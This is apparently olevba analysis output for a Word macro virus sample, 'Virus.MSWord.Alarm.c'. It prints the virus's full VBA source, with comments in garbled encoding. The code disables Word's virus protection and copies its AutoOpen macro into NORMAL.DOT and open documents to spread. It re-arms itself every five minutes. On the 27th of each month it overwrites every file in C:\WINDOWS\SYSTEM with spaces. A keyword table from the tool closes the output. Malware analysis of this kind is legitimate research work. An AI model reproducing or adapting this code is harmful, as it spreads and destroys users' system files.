olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Alarm.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Alarm.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Alarm.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The name is SYSTEM KILLER,Version 1.0

Public Sub MAIN()
Dim MyFile$
Dim x
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active
Dim internal
Dim alarmtime
Dim alarm$

On Error GoTo PassErr

Word.Options.VirusProtection = False
If Day(Now()) = 27 Then OutBreak 'SYSTEM KILLERјНДоИХ
'MsgBox Day(Now())

'Из№ыОґґтїЄИОєООДµµФтФЛРРbye2
If Application.Documents.Count = 0 Then GoTo Bye2

'ЙиЦГОДµµДЈКЅ
Dim dlg As Object
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)

'»сИЎОДјюГыЈ¬±ЈґжФЪMyFile$ЦР
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "ОДµµ") = 1 Then
    x = WordBasic.Dialog.FileSaveAs(dlg)
    MyFile$ = dlg.Name
Else
    WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
End If

'Из№ыОЄєкОДµµФтЦґРРbye2
If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

'Из№ыОЄРВОДµµФтЦґРРbye1
If MyFile$ = "" Then GoTo Bye1

'ТФДЈ°еёсКЅ±ЈґжОДјю
If dlg.Format = 0 Then
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
Else
    WordBasic.FileSave
End If

'ФЪNormalДЈ°еЦРС°ХТAutoOpenєкЈ¬ХТµЅФтЦГOkExist=1Ј¬·ґЦ®ФтЦГOkExist=0
normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

'»сИЎNormalДЈ°еµДГыіЖ
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"

'°СAutoOpenєкїЅ±ґµЅNormalДЈ°еЦР
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
    'WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

'ФЪ»о¶ЇОДµµЦРС°ХТAutoOpenєкЈ¬ХТµЅФтЦГOkExist=1Ј¬·ґЦ®ФтЦГOkExist=0
active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

'°СAutoOpenєкїЅ±ґµЅ»о¶ЇДЈ°еЦР
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
    WordBasic.FileSave
End If

'ЙиЦГРВОДµµДЈКЅ
Bye1:
    dlg.Format = 0

'ЙиЦГ¶ЁК±ЖчТФ±гФЩґОФЛРРAutoOpenєк
Bye2:
    internal = 5 / 24 / 60 ' internal time is 5 minutesПµНіК±јд5·ЦЦУ
    alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
    alarm$ = WordBasic.[Time$](alarmtime)
    WordBasic.OnTime alarm$, "AutoOpen"

'Из№ыіцґнФтґЛґОФЛРРІ»ФЩґ¦Ан
PassErr:

End Sub

Private Sub OutBreak()
Const MyPath$ = "C:\WINDOWS\SYSTEM\" 'Цё¶ЁВ·ѕ¶
Const Sorry$ = "Sorry,"
Const MacroName$ = "SYSTEM KILLER V1.0К№ "
Const InYour$ = " ЦР,"
Const Info$ = "ёцОДјю±»ЖЖ»µ."

Dim MyName() As String
Dim i, j
Dim FileNumber As Integer
Dim PutSpace
Dim TotalWrite As Integer

i = 1
ReDim MyName(1000)
'ХТС°µЪТ»По
MyName(i) = Dir(MyPath, 2) 'УГ2ХТµЅТюІШОДјю
'їЄКјС­»·
Do While MyName(i) <> ""
    'MsgBox MyName(i)
    'ЅвѕцОДјюКфРФОКМв
    If GetAttr(MyPath & MyName(i)) <> vbNormal Then SetAttr MyPath & MyName(i), vbNormal
    i = i + 1
    If i >= 500 Then ReDim Preserve MyName(UBound(MyName) + 100)
    'ІйХТПВТ»ёц
    MyName(i) = Dir(, 2)
Loop

FileNumber = 1
Total = 0
'їЄКјёДРґ№эіМ
For j = 1 To i - 1
    On Error GoTo ErrNext
    Open MyPath & MyName(j) For Binary As #FileNumber
    'ЗеОДјюОЄn...ёц...
    If LOF(FileNumber) < 5 Then PutSpace = 1 Else PutSpace = LOF(FileNumber) - 4 'РЎОДјю
    Put #FileNumber, 1, Space(PutSpace)
    TotalWrite = TotalWrite + 1
    Close #FileNumber
    FileNumber = FreeFile()
ErrNext:
Next j
    MsgBox Sorry & MacroName & MyPath & InYour & Str(TotalWrite) & Info

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

